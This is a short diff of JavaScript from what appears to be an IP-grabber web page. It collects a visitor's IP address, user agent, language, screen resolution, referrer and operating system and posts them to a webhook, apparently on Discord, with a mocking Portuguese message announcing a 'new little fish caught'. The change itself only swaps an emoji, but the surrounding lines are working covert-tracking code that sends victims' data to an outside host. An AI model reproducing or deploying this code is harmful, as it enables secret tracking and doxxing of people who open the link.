@@ -12,7 +12,7 @@
         const referrer = document.referrer;
         const operatingSystem = navigator.platform;
 
-        const message = `@everyone Novo peixinho pescado oniichans👉👈☺️ \nIP do peixinho: ${ipAddress} \nUser-Agent: ${userAgent} \nNavegador Linguagem: ${language} \nResolução da tela: ${screenWidth}x${screenHeight} \nReferencial: ${referrer} \nSistema Operacional: ${operatingSystem}`;
+        const message = `@everyone Novo peixinho pescado oniichans👉👈😋 \nIP do peixinho: ${ipAddress} \nUser-Agent: ${userAgent} \nNavegador Linguagem: ${language} \nResolução da tela: ${screenWidth}x${screenHeight} \nReferencial: ${referrer} \nSistema Operacional: ${operatingSystem}`;
 
         fetch(webhookUrl, {
           method: 'POST',
